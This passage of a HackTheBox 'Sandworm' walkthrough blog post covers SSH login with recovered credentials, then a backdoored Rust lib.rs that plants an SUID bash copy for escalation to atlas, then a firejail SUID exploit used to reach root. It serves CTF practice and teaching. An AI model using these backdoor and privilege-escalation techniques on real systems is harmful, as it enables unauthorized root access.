        </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"silentobserver"</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="nl">"cookies"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"session"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nl">"expires"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
            </span><span class="nl">"path"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"secure"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
            </span><span class="nl">"value"</span><span class="p">:</span><span class="w"> </span><span class="s2">"eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA"</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="nl">"headers"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"Accept"</span><span class="p">:</span><span class="w"> </span><span class="s2">"application/json, */*;q=0.5"</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>We have SSH credentials for the <code class="language-plaintext highlighter-rouge">silentobserver</code> user</p><h3 id="ssh-"><span class="mr-2">SSH :</span><a href="#ssh-" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>silentobserver:quietLiketheWind22</p><p>With these creds, I can SSH as silentobserver</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>root㉿emsec<span class="o">)</span>-[~]
└─# ssh silentobserver@ssa.htb    
...[snip]...
Last login: Fri Nov 17 15:51:57 2023 from 10.10.14.112
silentobserver@sandworm:~<span class="nv">$ </span><span class="nb">whoami
</span>silentobserver
silentobserver@sandworm:~<span class="nv">$ </span>
</pre></table></code></div></div><p>And read <code class="language-plaintext highlighter-rouge">user.txt</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>silentobserver@sandworm:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
0646b5ff<span class="k">************************</span>
</pre></table></code></div></div><h2 id="silentobserver--atlas"><span class="mr-2">silentobserver –&gt; atlas</span><a href="#silentobserver--atlas" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Searching for SUID binaries, we found one that doesn’t seem common.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>silentobserver@sandworm:~<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null
/opt/tipnet/target/debug/tipnet
/opt/tipnet/target/debug/deps/tipnet-a859bd054535b3c1
/opt/tipnet/target/debug/deps/tipnet-dabc93f7704f7b48
/usr/local/bin/firejail
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
/usr/bin/mount
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/su
/usr/bin/fusermount3
</pre></table></code></div></div><h3 id="librs"><span class="mr-2">lib.rs</span><a href="#librs" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>By running pspy, we can deduce that the routine launched every two minutes is executed by root but as the user <code class="language-plaintext highlighter-rouge">atlas</code>, that it is Rust, and that the folder to target is <code class="language-plaintext highlighter-rouge">/opt/crates</code></p><p><a href="/assets/img/favicons/HackTheBox/Sandworm/pspy64-1.png" class="popup img-link "><img data-src="/assets/img/favicons/HackTheBox/Sandworm/pspy64-1.png" alt="Alt text" class="lazyload" data-proofer-ignore></a></p><p>In the directory <code class="language-plaintext highlighter-rouge">/opt/crates/logger/src</code>, we find a single lib.rs file. Through the process of elimination, we can reasonably assume that this is the file compiled by Atlas every two minutes.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>silentobserver@sandworm:/tmp<span class="nv">$ </span><span class="nb">cd</span> /opt/crates/logger/src 
silentobserver@sandworm:/opt/crates/logger/src<span class="nv">$ </span><span class="nb">ls
</span>lib.rs
silentobserver@sandworm:/opt/crates/logger/src<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 12
drwxrwxr-x 2 atlas silentobserver 4096 May  4  2023 <span class="nb">.</span>
drwxr-xr-x 5 atlas silentobserver 4096 May  4  2023 ..
<span class="nt">-rw-rw-r--</span> 1 atlas silentobserver  732 May  4  2023 lib.rs
silentobserver@sandworm:/opt/crates/logger/src<span class="nv">$ </span>
</pre></table></code></div></div><p>Essentially, the code interacts with a database using upstream to pull and manipulate files. Notably, it uses an external library: extern crate logger. What makes this interesting is that the library is not imported from the internet but from the machine itself. So, it must be located within the project. After a brief search, we find it at the path: <code class="language-plaintext highlighter-rouge">/opt/crates/logger/src</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre>extern crate chrono<span class="p">;</span>

use std::fs::OpenOptions<span class="p">;</span>
use std::io::Write<span class="p">;</span>
use chrono::prelude::<span class="k">*</span><span class="p">;</span>

pub fn log<span class="o">(</span>user: &amp;str, query: &amp;str, justification: &amp;str<span class="o">)</span> <span class="o">{</span>
    <span class="nb">let </span>now <span class="o">=</span> Local::now<span class="o">()</span><span class="p">;</span>
    <span class="nb">let </span>timestamp <span class="o">=</span> now.format<span class="o">(</span><span class="s2">"%Y-%m-%d %H:%M:%S"</span><span class="o">)</span>.to_string<span class="o">()</span><span class="p">;</span>
    <span class="nb">let </span>log_message <span class="o">=</span> format!<span class="o">(</span><span class="s2">"[{}] - User: {}, Query: {}, Justification: {}</span><span class="se">\n</span><span class="s2">"</span>, timestamp, user, query, justification<span class="o">)</span><span class="p">;</span>

    <span class="nb">let </span>mut file <span class="o">=</span> match OpenOptions::new<span class="o">()</span>.append<span class="o">(</span><span class="nb">true</span><span class="o">)</span>.create<span class="o">(</span><span class="nb">true</span><span class="o">)</span>.open<span class="o">(</span><span class="s2">"/opt/tipnet/access.log"</span><span class="o">)</span> <span class="o">{</span>
        Ok<span class="o">(</span>file<span class="o">)</span> <span class="o">=&gt;</span> file,
        Err<span class="o">(</span>e<span class="o">)</span> <span class="o">=&gt;</span> <span class="o">{</span>
            println!<span class="o">(</span><span class="s2">"Error opening log file: {}"</span>, e<span class="o">)</span><span class="p">;</span>
            <span class="k">return</span><span class="p">;</span>
        <span class="o">}</span>
    <span class="o">}</span><span class="p">;</span>

    <span class="k">if </span><span class="nb">let </span>Err<span class="o">(</span>e<span class="o">)</span> <span class="o">=</span> file.write_all<span class="o">(</span>log_message.as_bytes<span class="o">())</span> <span class="o">{</span>
        println!<span class="o">(</span><span class="s2">"Error writing to log file: {}"</span>, e<span class="o">)</span><span class="p">;</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></table></code></div></div><p>If we see its permissions, in the group part it tells us that there are read and write permissions for the silentobserver group :</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>silentobserver@sandworm:/opt/crates/logger/src<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> lib.rs 
<span class="nt">-rw-rw-r--</span> 1 atlas silentobserver 732 May  4  2023 lib.rs
</pre></table></code></div></div><p>Fortunately, we belong to that group:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>silentobserver@sandworm:/opt/crates/logger/src<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>silentobserver<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>silentobserver<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>silentobserver<span class="o">)</span>
</pre></table></code></div></div><p>The exploitation involves modifying <code class="language-plaintext highlighter-rouge">/opt/crates/logger/src/lib.rs</code> to copy <code class="language-plaintext highlighter-rouge">/bin/bash</code> to <code class="language-plaintext highlighter-rouge">/tmp/bash</code> and add SUID to it, like this:</p><h3 id="modifing-librs"><span class="mr-2">Modifing lib.rs</span><a href="#modifing-librs" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
</pre><td class="rouge-code"><pre>extern crate chrono<span class="p">;</span>

use std::fs::<span class="o">{</span>self, OpenOptions<span class="o">}</span><span class="p">;</span>
use std::io::Write<span class="p">;</span>
use std::process::Command<span class="p">;</span>
use chrono::prelude::<span class="k">*</span><span class="p">;</span>

pub fn log<span class="o">(</span>user: &amp;str, query: &amp;str, justification: &amp;str<span class="o">)</span> <span class="o">{</span>
    <span class="nb">let </span>now <span class="o">=</span> Local::now<span class="o">()</span><span class="p">;</span>
    <span class="nb">let </span>timestamp <span class="o">=</span> now.format<span class="o">(</span><span class="s2">"%Y-%m-%d %H:%M:%S"</span><span class="o">)</span>.to_string<span class="o">()</span><span class="p">;</span>
    <span class="nb">let </span>log_message <span class="o">=</span> format!<span class="o">(</span>
        <span class="s2">"[{}] - User: {}, Query: {}, Justification: {}</span><span class="se">\n</span><span class="s2">"</span>,
        timestamp, user, query, justification
    <span class="o">)</span><span class="p">;</span>

    <span class="nb">let </span>mut file <span class="o">=</span> match OpenOptions::new<span class="o">()</span>
        .append<span class="o">(</span><span class="nb">true</span><span class="o">)</span>
        .create<span class="o">(</span><span class="nb">true</span><span class="o">)</span>
        .open<span class="o">(</span><span class="s2">"/opt/tipnet/access.log"</span><span class="o">)</span>
    <span class="o">{</span>
        Ok<span class="o">(</span>file<span class="o">)</span> <span class="o">=&gt;</span> file,
        Err<span class="o">(</span>e<span class="o">)</span> <span class="o">=&gt;</span> <span class="o">{</span>
            println!<span class="o">(</span><span class="s2">"Error opening log file: {}"</span>, e<span class="o">)</span><span class="p">;</span>
            <span class="k">return</span><span class="p">;</span>
        <span class="o">}</span>
    <span class="o">}</span><span class="p">;</span>

    <span class="k">if </span><span class="nb">let </span>Err<span class="o">(</span>e<span class="o">)</span> <span class="o">=</span> file.write_all<span class="o">(</span>log_message.as_bytes<span class="o">())</span> <span class="o">{</span>
        println!<span class="o">(</span><span class="s2">"Error writing to log file: {}"</span>, e<span class="o">)</span><span class="p">;</span>
    <span class="o">}</span>

    // Copy /bin/bash to /tmp/bash
    <span class="k">if </span><span class="nb">let </span>Err<span class="o">(</span>e<span class="o">)</span> <span class="o">=</span> fs::copy<span class="o">(</span><span class="s2">"/bin/bash"</span>, <span class="s2">"/tmp/bash"</span><span class="o">)</span> <span class="o">{</span>
        println!<span class="o">(</span><span class="s2">"Error copying file: {}"</span>, e<span class="o">)</span><span class="p">;</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="o">}</span>

    // Set SUID permission on /tmp/bash
    <span class="k">if </span><span class="nb">let </span>Err<span class="o">(</span>e<span class="o">)</span> <span class="o">=</span> Command::new<span class="o">(</span><span class="s2">"chmod"</span><span class="o">)</span>
        .args<span class="o">(</span>&amp;[<span class="s2">"+s"</span>, <span class="s2">"/tmp/bash"</span><span class="o">])</span>
        .output<span class="o">()</span>
    <span class="o">{</span>
        println!<span class="o">(</span><span class="s2">"Error setting SUID permission: {}"</span>, e<span class="o">)</span><span class="p">;</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></table></code></div></div><p>Then run <code class="language-plaintext highlighter-rouge">/tmp/bash -p</code> after a few minutes to gain control of atlas</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>silentobserver@sandworm:/opt/crates/logger/src<span class="nv">$ </span>/tmp/bash <span class="nt">-p</span>
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
bash-5.1<span class="nv">$ </span><span class="nb">whoami
</span>atlas
bash-5.1<span class="nv">$ </span>
</pre></table></code></div></div><p>By adding our public SSH key to the ‘atlas’ user, we can easily connect using SSH.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>root㉿emsec<span class="o">)</span>-[~/.ssh]
└─# ssh <span class="nt">-i</span> id_rsa atlas@ssa.htb
Welcome to Ubuntu 22.04.2 LTS <span class="o">(</span>GNU/Linux 5.15.0-73-generic x86_64<span class="o">)</span>
...[snip]...
Last login: Sat Nov 18 11:21:21 2023 from 10.10.14.43
atlas@sandworm:~<span class="nv">$ </span>
</pre></table></code></div></div><h2 id="privilege-escalation--atlas---root"><span class="mr-2">Privilege escalation : atlas -&gt; root</span><a href="#privilege-escalation--atlas---root" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="enumeration"><span class="mr-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Upon checking the user and group ID, it is revealed that the <code class="language-plaintext highlighter-rouge">atlas</code> user belongs to a group called ‘jailer’.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>atlas@sandworm:~<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>atlas<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>atlas<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>atlas<span class="o">)</span>,1002<span class="o">(</span>jailer<span class="o">)</span>

</pre></table></code></div></div><p>If we search for SUID biaries we can see one from firejail:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>atlas@sandworm:~<span class="nv">$ </span>find / <span class="nt">-group</span> jailer <span class="nt">-ls</span> 2&gt;/dev/null
     1344   1740 <span class="nt">-rwsr-x---</span>   1 root     jailer    1777952 Nov 29  2022 /usr/local/bin/firejail
atlas@sandworm:~<span class="nv">$ </span>
</pre></table></code></div></div><h3 id="suid-firejail-privilege-escalation"><span class="mr-2">SUID firejail privilege escalation</span><a href="#suid-firejail-privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Here, the next step involves searching Google for firejail exploits that enable privilege escalation. I came across <a href="https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25">this one</a>:</p><p><a href="/assets/img/favicons/HackTheBox/Sandworm/firejail.png" class="popup img-link "><img data-src="/assets/img/favicons/HackTheBox/Sandworm/firejail.png" alt="Alt text" class="lazyload" data-proofer-ignore></a></p><p>So, acquire the exploit.py, grant it execute permissions, and execute it. Once run, background the process, then execute ‘firejail –join=27179’ and ‘su -‘ to obtain root access.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>atlas@sandworm:/tmp<span class="nv">$ </span><span class="nb">chmod</span> +x exploit.py 
atlas@sandworm:/tmp<span class="nv">$ </span>./exploit.py 
You can now run <span class="s1">'firejail --join=27179'</span> <span class="k">in </span>another terminal to obtain a shell where <span class="s1">'sudo su -'</span> should grant you a root shell.
^Z
<span class="o">[</span>1]+  Stopped                 ./exploit.py
atlas@sandworm:/tmp<span class="nv">$ </span>firejail <span class="nt">--join</span><span class="o">=</span>27179
changing root to /proc/27179/root
Warning: cleaning all supplementary <span class="nb">groups
</span>Child process initialized <span class="k">in </span>10.03 ms
atlas@sandworm:/tmp<span class="nv">$ </span>su -
root@sandworm:~# <span class="nb">cat</span> /root/root.txt
12d54f557<span class="k">*************************</span>
root@sandworm:~# 
</pre></table></code></div></div><p><strong>Happy Hacking ! 👾​❤️​</strong></p><h1 id="references-">References :</h1><p><a href="https://www.varonis.com/blog/pgp-encryption">What is PGP Encryption and How Does It Work?</a></p><p><a href="https://www.gnupg.org/gph/en/manual/x135.html">Making and verifying signatures</a></p><p><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">SSTI (Server Side Template Injection)</a></p><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2">PayloadsAllTheThings/Server Side Template Injection/</a></p><p><a href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/#firejail">SUID Firejail</a></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox-walkthrough/'>HackTheBox Walkthrough</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/hackthebox/" class="post-tag no-text-decoration" >HackTheBox</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox-Sandworm%20Walkthrough%20-%20Mostafa%20Toumi&url=%2Fposts%2FHackTheBox-Sandworm%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox-Sandworm%20Walkthrough%20-%20Mostafa%20Toumi&u=%2Fposts%2FHackTheBox-Sandworm%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=%2Fposts%2FHackTheBox-Sandworm%2F&text=HackTheBox-Sandworm%20Walkthrough%20-%20Mostafa%20Toumi" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=%2Fposts%2FHackTheBox-Sandworm%2F" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <a href="http://service.weibo.com/share/share.php?title=HackTheBox-Sandworm%20Walkthrough%20-%20Mostafa%20Toumi&url=%2Fposts%2FHackTheBox-Sandworm%2F" data-toggle="tooltip" data-placement="top" title="Weibo" target="_blank" rel="noopener" aria-label="Weibo"> <i class="fa-fw fab fa-weibo"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/LDAP/">LDAP Lightweight Directory Access Protocol</a><li><a href="/posts/HackTheBox-Sau/">HackTheBox-Sau Walkthrough</a><li><a href="/posts/DNS/">DNS Domain Name System</a><li><a href="/posts/ActiveDirectory_Management_with_Powershell/">Active Directory Management - A PowerShell Journey</a><li><a href="/posts/ADDC-LAB-PART_01/">Active Directory Mastery - A Guide to Windows Server Setup for Penetration Testing</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/active-directory/">Active Directory</a> <a class="post-tag" href="/tags/hackthebox/">HackTheBox</a> <a class="post-tag" href="/tags/python/">python</a> <a class="post-tag" href="/tags/dns/">DNS</a> <a class="post-tag" href="/tags/kerberos/">Kerberos</a> <a class="post-tag" href="/tags/ldap3/">ldap3</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ntlm/">NTLM</a> <a class="post-tag" href="/tags/powershell/">powershell</a> <a class="post-tag" href="/tags/python3/">python3</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc"></nav></div><script src="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.js"></script></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5"><div id="related-posts" class="mb-2 mb-sm-4"><h3 class="pt-2 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HackTheBox-Sekhmet_/"><div class="card-body"> <em class="small" data-ts="1680091200" data-df="ll" > Mar 29, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox-Sekhmet Walkthrough</h3><div class="text-muted small"><p> Hello everyone, This is EmSec, and I&#39;m excited to share my experience of solving the Sekhmet machine from HackTheBox. As an enthusiast of cybersecurity, I&#39;ve been exploring various hacking chal...</p></div></div></a></div><div class="card"> <a href="/posts/HackTheBox-Derailed/"><div class="card-body"> <em class="small" data-ts="1689854400" data-df="ll" > Jul 20, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox-Derailed Walkthrough</h3><div class="text-muted small"><p> Box Info Derailed is an incredibly challenging Linux machine that focuses on exploiting web vulnerabilities, including Stored Cross-Site Scripting, Session Riding, Arbitrary File Inclusion, an...</p></div></div></a></div><div class="card"> <a href="/posts/HackTheBox-Sau/"><div class="card-body"> <em class="small" data-ts="1703854800" data-df="ll" > Dec 29, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox-Sau Walkthrough</h3><div class="text-muted small"><p> Description : Sau is an easy Hack The Box machine that features two vulnerabilities on its website—SSRF on the main site and OS Command Injection in a locally running website named Maltrail on port...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/HackTheBox-Derailed/" class="btn btn-outline-primary" prompt="Older"><p>HackTheBox-Derailed Walkthrough</p></a> <a href="/posts/HackTheBox-Sau/" class="btn btn-outline-primary" prompt="Newer"><p>HackTheBox-Sau Walkthrough</p></a></div></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/active-directory/">Active Directory</a> <a class="post-tag" href="/tags/hackthebox/">HackTheBox</a> <a class="post-tag" href="/tags/python/">python</a> <a class="post-tag" href="/tags/dns/">DNS</a> <a class="post-tag" href="/tags/kerberos/">Kerberos</a> <a class="post-tag" href="/tags/ldap3/">ldap3</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ntlm/">NTLM</a> <a class="post-tag" href="/tags/powershell/">powershell</a> <a class="post-tag" href="/tags/python3/">python3</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><footer><div class="container pl-lg-4 pr-lg-4"><div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://twitter.com/EmSec0">Mostafa Toumi</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0">Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></div></footer><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lazysizes@5.3.2/lazysizes.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
